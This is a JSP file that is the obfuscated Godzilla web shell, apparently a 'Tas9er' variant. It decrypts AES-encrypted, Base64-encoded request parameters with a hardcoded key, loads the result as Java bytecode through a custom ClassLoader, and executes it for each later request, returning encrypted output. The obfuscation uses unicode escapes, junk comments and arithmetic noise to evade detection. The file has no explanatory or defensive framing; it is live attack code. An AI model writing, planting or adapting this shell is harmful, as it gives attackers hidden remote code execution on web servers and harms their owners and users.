Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_L56R0cLCzxH6rzN = "932c34e0066bc061";
    String govsb_QOTVXsyNl = "Tas9er";
    class govsb_bPu1OJLPPAU extends /*edusb_gqYG40W8Q*/ClassLoader {
        public govsb_bPu1OJLPPAU(ClassLoader govsb_avOKG) {
            super/*edusb_N9PEQ1sQr*/(govsb_avOKG);
        }
        public Class govsb_4XTewgWfhoavU(byte[] govsb_ABTGEe) {
            return super./*edusb_Dzp3GbXEOwRVRxn*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_4j*/(govsb_ABTGEe, 1114521-1114521, govsb_ABTGEe.length);
        }
    }
    public byte[] govsb_cJ2ol1E65t4G5(byte[] govsb_S4tZT, boolean govsb_awk8o1Lq5tX) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_eQJwzb3JJVj8hzs*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_xAkUV4tkPatnmIO = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_MCADCFe*/("AES");
            govsb_xAkUV4tkPatnmIO.init(govsb_awk8o1Lq5tX?1114521/1114521:1114521/1114521+1114521/1114521,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_w*/SecretKeySpec/*edusb_zRGQGG*/(govsb_L56R0cLCzxH6rzN.getBytes(), "AES"));
            return govsb_xAkUV4tkPatnmIO.doFinal/*edusb_bmv8*/(govsb_S4tZT);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_VyLZ = java.util.Base64./*edusb_Gn8PX*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_eLWH50rSoqMll*/decode(request.getParameter(govsb_QOTVXsyNl));
        govsb_VyLZ = govsb_cJ2ol1E65t4G5(govsb_VyLZ,false);
        if (session.getAttribute/*edusb_UM5gc8OOL8*/("payload") == null) {
            session.setAttribute("payload", new govsb_bPu1OJLPPAU(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_hu*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_Mvr5AXf0rLsBb2c*/.govsb_4XTewgWfhoavU(govsb_VyLZ));
        } else {
            request.setAttribute("parameters", govsb_VyLZ);
            java.io.ByteArrayOutputStream govsb_mlAaaC6hZ9E = new java.io./*edusb_x*/ByteArrayOutputStream();
            Object govsb_jNLW = /*edusb_RRAK4DBqkOIYd3L*/((Class) session.getAttribute("payload"))./*edusb_HXPlPK1lTABq*//*edusb_yrNeR*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_RIzPskY1*/;
            govsb_jNLW.equals(govsb_mlAaaC6hZ9E);
            govsb_jNLW.equals(pageContext);
            response.getWriter().write("AC4726CEFAF5366B366CEAB68834911A".substring(1114521-1114521, 16));
            govsb_jNLW.toString();
            response.getWriter().write(java.util.Base64/*edusb_sltZ*/.getEncoder()/*edusb_JUxd3Ngrwg9It5U*/.encodeToString(govsb_cJ2ol1E65t4G5(govsb_mlAaaC6hZ9E.toByteArray(),true)));
            response.getWriter().write("AC4726CEFAF5366B366CEAB68834911A".substring(16));
        }
    } catch (Exception e) {
    }
%>